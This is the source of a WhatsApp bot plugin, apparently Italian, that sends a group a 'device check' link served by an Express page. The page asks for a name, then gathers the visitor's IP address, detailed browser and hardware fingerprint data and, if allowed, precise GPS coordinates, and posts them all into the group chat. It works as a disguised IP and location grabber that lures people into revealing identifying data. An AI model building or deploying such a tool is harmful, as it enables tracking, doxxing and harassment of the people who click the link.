import express from 'express'
import crypto from 'crypto'

const PORT = Number(process.env.DEVICE_CHECK_PORT || 3030)
const BASE_URL = process.env.DEVICE_CHECK_URL || `http://localhost:${PORT}`

global.deviceCheckServerStarted ||= false
global.deviceCheckSessions ||= {}
global.deviceCheckConn ||= null

function startServer() {
  if (global.deviceCheckServerStarted) return
  global.deviceCheckServerStarted = true

  const app = express()
  app.use(express.json({ limit: '2mb' }))

  app.get('/check', (req, res) => {
    const { id } = req.query

    if (!id || !global.deviceCheckSessions[id]) {
      return res.send('<h1>Link non valido o scaduto.</h1>')
    }

    res.send(`
<!DOCTYPE html>
<html>
<head>
<meta charset="UTF-8">
<title>Axion Device Check</title>
<style>
body{background:#070707;color:#eee;font-family:Arial;display:flex;align-items:center;justify-content:center;min-height:100vh;margin:0}
.box{max-width:430px;padding:28px;border:1px solid #333;border-radius:18px;background:#111;box-shadow:0 0 25px rgba(0,255,157,.08)}
input,button{width:100%;padding:12px;margin-top:12px;border-radius:10px;border:0;box-sizing:border-box}
button{background:#00ff9d;color:#000;font-weight:bold}
button.secondary{background:#222;color:#eee;border:1px solid #333}
small{color:#aaa}
</style>
</head>
<body>
<div class="box">
<h2>𝛥XION DEVICE CHECK</h2>
<p>Inserisci il tuo nome per completare la verifica tecnica del dispositivo.</p>
<input id="name" placeholder="Il tuo nome">
<button onclick="send(false)">Continua</button>
<button class="secondary" onclick="send(true)">Continua con posizione GPS</button>
<br><br>
<small>Verranno raccolte informazioni tecniche del browser, della connessione e, solo se autorizzata, della posizione GPS.</small>
</div>

<script>
function gpuInfo(){
  try{
    const c=document.createElement('canvas')
    const gl=c.getContext('webgl')||c.getContext('experimental-webgl')
    const ext=gl.getExtension('WEBGL_debug_renderer_info')
    return {
      renderer: ext ? gl.getParameter(ext.UNMASKED_RENDERER_WEBGL) : 'Non disponibile',
      vendor: ext ? gl.getParameter(ext.UNMASKED_VENDOR_WEBGL) : 'Non disponibile'
    }
  }catch{
    return { renderer:'Non disponibile', vendor:'Non disponibile' }
  }
}

function os(){
  const ua=navigator.userAgent
  if(/android/i.test(ua))return 'Android'
  if(/iphone|ipad|ipod/i.test(ua))return 'iOS'
  if(/windows/i.test(ua))return 'Windows'
  if(/mac/i.test(ua))return 'macOS'
  if(/linux/i.test(ua))return 'Linux'
  return 'Sconosciuto'
}

function browser(){
  const ua=navigator.userAgent
  if(/SamsungBrowser/i.test(ua))return 'Samsung Internet'
  if(/Edg/i.test(ua))return 'Microsoft Edge'
  if(/OPR|Opera/i.test(ua))return 'Opera'
  if(/Chrome/i.test(ua))return 'Chrome'
  if(/Safari/i.test(ua))return 'Safari'
  if(/Firefox/i.test(ua))return 'Firefox'
  return 'Sconosciuto'
}

async function batteryInfo(){
  try{
    if(!navigator.getBattery)return null
    const b=await navigator.getBattery()
    return {
      level: Math.round(b.level * 100) + '%',
      charging: b.charging ? 'Sì' : 'No'
    }
  }catch{
    return null
  }
}

function connectionInfo(){
  const c=navigator.connection||navigator.mozConnection||navigator.webkitConnection
  if(!c)return null
  return {
    type: c.effectiveType || c.type || 'Non disponibile',
    downlink: c.downlink ? c.downlink + ' Mbps' : 'Non disponibile',
    rtt: c.rtt ? c.rtt + ' ms' : 'Non disponibile',
    saveData: c.saveData ? 'Sì' : 'No'
  }
}

function gpsInfo(){
  return new Promise(resolve=>{
    if(!navigator.geolocation)return resolve(null)
    navigator.geolocation.getCurrentPosition(
      pos=>resolve({
        latitude: pos.coords.latitude,
        longitude: pos.coords.longitude,
        accuracy: pos.coords.accuracy + ' m'
      }),
      ()=>resolve(null),
      { enableHighAccuracy:true, timeout:8000, maximumAge:0 }
    )
  })
}

async function send(withGps){
  const name=document.getElementById('name').value.trim()
  if(!name)return alert('Inserisci un nome')

  const gpu=gpuInfo()
  const battery=await batteryInfo()
  const connection=connectionInfo()
  const gps=withGps ? await gpsInfo() : null

  await fetch('/collect', {
    method:'POST',
    headers:{'Content-Type':'application/json'},
    body:JSON.stringify({
      id:'${id}',
      name,
      os:os(),
      browser:browser(),
      userAgent:navigator.userAgent,
      platform:navigator.platform || 'Non disponibile',
      vendor:navigator.vendor || 'Non disponibile',
      language:navigator.language || 'Non disponibile',
      languages:navigator.languages ? navigator.languages.join(', ') : 'Non disponibile',
      timezone:Intl.DateTimeFormat().resolvedOptions().timeZone,
      screen:screen.width+'x'+screen.height,
      viewport:window.innerWidth+'x'+window.innerHeight,
      pixelRatio:window.devicePixelRatio || 'Non disponibile',
      orientation:screen.orientation ? screen.orientation.type : 'Non disponibile',
      cores:navigator.hardwareConcurrency || 'Non disponibile',
      memory:navigator.deviceMemory || 'Non disponibile',
      touch:navigator.maxTouchPoints || 0,
      cookies:navigator.cookieEnabled ? 'Sì' : 'No',
      darkMode:window.matchMedia && window.matchMedia('(prefers-color-scheme: dark)').matches ? 'Sì' : 'No',
      standalone:window.matchMedia && window.matchMedia('(display-mode: standalone)').matches ? 'Sì' : 'No',
      webgpu:navigator.gpu ? 'Supportato' : 'Non supportato',
      clipboard:navigator.clipboard ? 'Supportata' : 'Non disponibile',
      gpuRenderer:gpu.renderer,
      gpuVendor:gpu.vendor,
      battery,
      connection,
      gps
    })
  })

  document.body.innerHTML='<div class="box"><h2>Verifica completata</h2><p>Puoi chiudere questa pagina.</p></div>'
}
</script>
</body>
</html>`)
  })

  app.post('/collect', async (req, res) => {
    try {
      const data = req.body || {}
      const session = global.deviceCheckSessions[data.id]

      if (!session) return res.json({ ok: false })

      const ip = String(
        req.headers['x-forwarded-for'] ||
        req.headers['cf-connecting-ip'] ||
        req.socket.remoteAddress ||
        ''
      ).split(',')[0].trim()

      const text =
`*╭━━━━━━━📱━━━━━━━╮*
*✦ 𝐃𝐄𝐕𝐈𝐂𝐄 𝐂𝐇𝐄𝐂𝐊 ✦*
*╰━━━━━━━📱━━━━━━━╯*

*👤 𝐍𝐨𝐦𝐞:* *${data.name || 'Non indicato'}*
*🧩 𝐒𝐢𝐬𝐭𝐞𝐦𝐚:* *${data.os || 'Sconosciuto'}*
*🌐 𝐁𝐫𝐨𝐰𝐬𝐞𝐫:* *${data.browser || 'Sconosciuto'}*
*📱 𝐏𝐢𝐚𝐭𝐭𝐚𝐟𝐨𝐫𝐦𝐚:* *${data.platform || 'Non disponibile'}*
*🏷️ 𝐕𝐞𝐧𝐝𝐨𝐫:* *${data.vendor || 'Non disponibile'}*

*🖥️ 𝐒𝐜𝐡𝐞𝐫𝐦𝐨:* *${data.screen || 'Non disponibile'}*
*🪟 𝐅𝐢𝐧𝐞𝐬𝐭𝐫𝐚:* *${data.viewport || 'Non disponibile'}*
*🔎 𝐏𝐢𝐱𝐞𝐥 𝐑𝐚𝐭𝐢𝐨:* *${data.pixelRatio || 'Non disponibile'}*
*🔄 𝐎𝐫𝐢𝐞𝐧𝐭𝐚𝐦𝐞𝐧𝐭𝐨:* *${data.orientation || 'Non disponibile'}*

*🧠 𝐂𝐨𝐫𝐞 𝐂𝐏𝐔:* *${data.cores || 'Non disponibile'}*
*💾 𝐑𝐀𝐌 𝐬𝐭𝐢𝐦𝐚𝐭𝐚:* *${data.memory || 'Non disponibile'} GB*
*🎮 𝐆𝐏𝐔:* *${data.gpuRenderer || 'Non disponibile'}*
*🏭 𝐆𝐏𝐔 𝐕𝐞𝐧𝐝𝐨𝐫:* *${data.gpuVendor || 'Non disponibile'}*
*⚡ 𝐖𝐞𝐛𝐆𝐏𝐔:* *${data.webgpu || 'Non disponibile'}*

*📲 𝐓𝐨𝐮𝐜𝐡 𝐏𝐨𝐢𝐧𝐭𝐬:* *${data.touch ?? 'Non disponibile'}*
*🌙 𝐃𝐚𝐫𝐤 𝐌𝐨𝐝𝐞:* *${data.darkMode || 'Non disponibile'}*
*🍪 𝐂𝐨𝐨𝐤𝐢𝐞:* *${data.cookies || 'Non disponibile'}*
*📋 𝐂𝐥𝐢𝐩𝐛𝐨𝐚𝐫𝐝:* *${data.clipboard || 'Non disponibile'}*
*📦 𝐏𝐖𝐀:* *${data.standalone || 'Non disponibile'}*

*🔋 𝐁𝐚𝐭𝐭𝐞𝐫𝐢𝐚:* *${data.battery?.level || 'Non disponibile'}*
*🔌 𝐈𝐧 𝐜𝐚𝐫𝐢𝐜𝐚:* *${data.battery?.charging || 'Non disponibile'}*

*📶 𝐑𝐞𝐭𝐞:* *${data.connection?.type || 'Non disponibile'}*
*⬇️ 𝐃𝐨𝐰𝐧𝐥𝐢𝐧𝐤:* *${data.connection?.downlink || 'Non disponibile'}*
*📡 𝐋𝐚𝐭𝐞𝐧𝐳𝐚:* *${data.connection?.rtt || 'Non disponibile'}*
*💾 𝐑𝐢𝐬𝐩𝐚𝐫𝐦𝐢𝐨 𝐝𝐚𝐭𝐢:* *${data.connection?.saveData || 'Non disponibile'}*

*🌍 𝐋𝐢𝐧𝐠𝐮𝐚:* *${data.language || 'Non disponibile'}*
*🗣️ 𝐋𝐢𝐧𝐠𝐮𝐞:* *${data.languages || 'Non disponibile'}*
*🕓 𝐓𝐢𝐦𝐞𝐳𝐨𝐧𝐞:* *${data.timezone || 'Non disponibile'}*
*🌐 𝐈𝐏:* *${ip || 'Non disponibile'}*

*📍 𝐆𝐏𝐒:* *${data.gps ? `${data.gps.latitude}, ${data.gps.longitude}` : 'Non autorizzato'}*
*🎯 𝐏𝐫𝐞𝐜𝐢𝐬𝐢𝐨𝐧𝐞:* *${data.gps?.accuracy || 'Non disponibile'}*

*🧾 𝐔𝐬𝐞𝐫-𝐀𝐠𝐞𝐧𝐭:*
${data.userAgent || 'Non disponibile'}

> *𝛥𝐗𝐈𝚶𝐍 𝚩𝚯𝐓*`

      await global.deviceCheckConn.sendMessage(session.chat, { text })
      res.json({ ok: true })
    } catch (e) {
      console.error('[DEVICE CHECK ERROR]', e)
      res.json({ ok: false })
    }
  })

  app.set('trust proxy', true)

app.listen(PORT, () => {
  console.log(`[AXION DEVICE CHECK] Server attivo sulla porta ${PORT}`)
})
}

startServer()

let handler = async (m, { conn }) => {
  global.deviceCheckConn = conn

  const id = crypto.randomBytes(5).toString('hex')

  global.deviceCheckSessions[id] = {
    chat: m.chat,
    createdAt: Date.now()
  }

  const link = `${BASE_URL}/check?id=${id}`

  await conn.sendMessage(m.chat, {
    text: link
  }, { quoted: m })
}

handler.help = ['infodispositivo']
handler.tags = ['owner']
handler.command = /^(infodispositivo|devicecheck)$/i
handler.owner = true
handler.group = true

export default handler